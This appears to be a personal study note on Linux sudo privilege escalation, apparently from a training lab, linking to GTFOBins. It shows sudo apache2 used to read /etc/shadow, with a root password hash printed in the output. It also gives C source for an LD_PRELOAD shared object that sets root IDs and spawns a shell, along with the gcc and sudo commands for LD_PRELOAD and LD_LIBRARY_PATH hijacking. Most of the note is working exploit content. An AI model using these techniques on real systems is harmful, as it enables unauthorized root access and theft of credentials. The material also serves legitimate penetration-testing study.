#priv_esc #Linux

```embed
title: "GTFOBins"
image: "https://gtfobins.github.io/assets/logo.png"
description: ""
url: "https://gtfobins.github.io/"
```
### Use apache2 to read /etc/shadow
```
user@debian:~$ sudo /usr/sbin/apache2 -f /etc/shadow

Syntax error on line 1 of /etc/shadow:
Invalid command 

'root:$6$Jkw8Ekqry9YO.eQ$5kMabK0diFMC94tKy0vGkL1WVEWrVfJP0FPoTOGAEneB5N12dR0P6cDVdCnBRml0/426nRKEzxL4N6QR2P9Fe1:17298:0:99999:7:::'

, perhaps misspelled or defined by a module not included in the server configuration
```

### Sudo Environment Variables
[[Priv_esc_cheatcodes]]
LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
```

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

- Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

- see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

- Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

- Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`